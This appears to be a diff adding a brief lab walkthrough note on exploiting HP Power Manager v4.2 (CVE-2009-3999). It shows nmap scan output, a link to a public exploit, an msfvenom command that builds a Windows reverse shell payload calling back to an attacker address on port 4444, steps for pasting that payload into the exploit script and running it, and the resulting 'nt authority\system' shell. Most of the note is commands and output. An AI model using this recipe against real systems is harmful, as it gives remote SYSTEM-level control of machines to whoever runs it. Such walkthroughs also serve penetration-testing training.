@@ -1,0 +1,23 @@
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          GoAhead WebServer
+|_http-server-header: GoAhead-Webs
+| http-methods: 
+|_  Supported Methods: GET HEAD
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.174.45/index.asp
+found version HP Power Manager v4.2 Build 7
+search and found: https://github.com/afifudinmtop/CVE-2009-3999/tree/main
+follow the steps:
+1. msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=4444 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
+2. copy output of msfvenom into script, remove b
+buf += b" to buf += "
+from line 34 to 62
+3. sudo python3 ./hp_pm_exploit_p3.py RHOST RPORT LPORT
+
+get a admin shell.
+C:\Users>whoami
+whoami
+nt authority\system
+
+
+
